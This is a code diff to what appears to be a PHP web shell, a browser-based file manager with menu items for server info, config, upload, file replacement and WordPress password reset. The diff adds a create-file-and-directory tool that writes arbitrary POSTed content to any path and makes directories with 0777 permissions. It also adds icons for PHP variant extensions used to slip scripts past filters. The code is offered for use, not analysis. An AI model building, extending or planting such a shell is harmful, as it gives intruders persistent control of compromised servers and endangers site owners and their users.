@@ -35,7 +35,7 @@
 	}
 	div.center {
 		overflow: auto;
-		max-height:580px;
+		max-height:550px;
 		border-radius:0px 0px 5px 0px;
 		padding:10px;
 		border-top: 1px solid #e6e6e6;
@@ -75,13 +75,14 @@
 		font-family: 'MuseoModerno', cursive;
 		width:100%;
 	}
-	div.edit {
+	div.edit, div.createfile {
 		padding:10px;
 	}
 	textarea {
 		border: 1px solid #e6e6e6;
 		outline: none;
 		padding:20px;
+		resize: none;
 		width: 100%;
 		height:300px;
 		border-radius:5px;
@@ -95,6 +96,14 @@
 		width:100%;
 		border-radius:5px;
 		background:#f2f2f2;
+		border: 1px solid #e6e6e6;
+		padding:7px;
+	}
+	input[type=text] {
+		font-family: 'MuseoModerno', cursive;
+		width:100%;
+		outline: none;
+		border-radius:5px;
 		border: 1px solid #e6e6e6;
 		padding:7px;
 	}
@@ -245,6 +254,9 @@
 					fwrite(self::$handle, $data);
 					fclose(self::$handle);
 					break;
+				case 'makedir':
+					return mkdir($filename, 0777);
+					break;
 			}
 		}
 		public static function perms($filename) {
@@ -260,8 +272,27 @@
     	public static function getimg($filename) {
         	self::$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
         	switch (self::$extension) {
+        		case 'php1':
+        		case 'php2':
+        		case 'php3':
+        		case 'php4':
+        		case 'php5':
+        		case 'php6':
+        		case 'phtml':
             	case 'php':
                 	print("https://image.flaticon.com/icons/png/128/337/337947.png");
+                	break;
+                case 'png':
+                	print("https://image.flaticon.com/icons/svg/337/337948.svg");
+                	break;
+                case 'py':
+                	print("https://www.flaticon.com/premium-icon/icons/svg/172/172546.svg");
+                	break;
+                case 'sh':
+                	print("https://image.flaticon.com/icons/svg/617/617535.svg");
+                	break;
+                case 'ini':
+                	print("https://image.flaticon.com/icons/svg/1126/1126890.svg");
                 	break;
             	default:
                 	print("https://image.flaticon.com/icons/svg/833/833524.svg");
@@ -340,11 +371,75 @@
 			<a href="#">Server Info</a>
 			<a href="#">Config</a>
 			<a href="#">Upload</a>
-			<a href="#">Create FIle</a>
+			<a href="?cd=<?= x::hex(x::cwd()) ?>&tool=<?= x::hex("createfile") ?>">Create FIle</a>
 			<a href="#">Replace File</a>
+			<a href="#">Music</a>
+			<a href="#">Make Quotes</a>
+			<a href="#">WP Reset Password</a>
+			<a href="#">Logout</a>
 		</div>
 		<div class="col-xs-10 center">
 			<?php
+			switch (isset($_GET['tool'])) {
+				case 'createfile':
+					if (isset($_POST['submit'])) {
+						switch ($_POST['type']) {
+							case 'file':
+								$type = 'makefile';
+								break;
+							case 'dir':
+								$type = 'makedir';
+								break;
+						}
+						if (x::save($_POST['filename'], $_POST['data'], $type)) {
+							print("success");
+						} else {
+							print("failed");
+						}
+					}
+					?>
+					<div class="createfile">
+						<table width="100%">
+							<form method="post">
+								<tr>
+									<td style="width:1px;">
+										<a href="?cd=<?= $_GET['cd'] ?>">
+											<img class="icons" src="https://mlisi.xyz/img/shademe.png">
+										</a>
+									</td>
+									<td class="action">CREATE FILE & DIR</td>
+								</tr>
+								<tr>
+									<td colspan="2">
+										<center>
+											<input type="radio" name="type" value="file"> file
+											<input type="radio" name="type" value="dir"> dir
+										</center>
+									</td>
+								</tr>
+								<tr>
+									<td colspan="2">
+										<input type="text" name="filename" placeholder="filename or dirname">
+									</td>
+								</tr>
+								<tr>
+									<td colspan="2">
+										<textarea name="data"></textarea>
+									</td>
+								</tr>
+								<tr>
+									<td colspan="2">
+										<input type="submit" name="submit">
+										<input type="hidden" name="tool" value="makefile">
+									</td>
+								</tr>
+							</form>
+						</table>
+					</div>
+					<?php
+					exit();
+					break;
+			}
 			switch (@$_POST['action']) {
 				case 'edit':
 					if (isset($_POST['edit'])) {
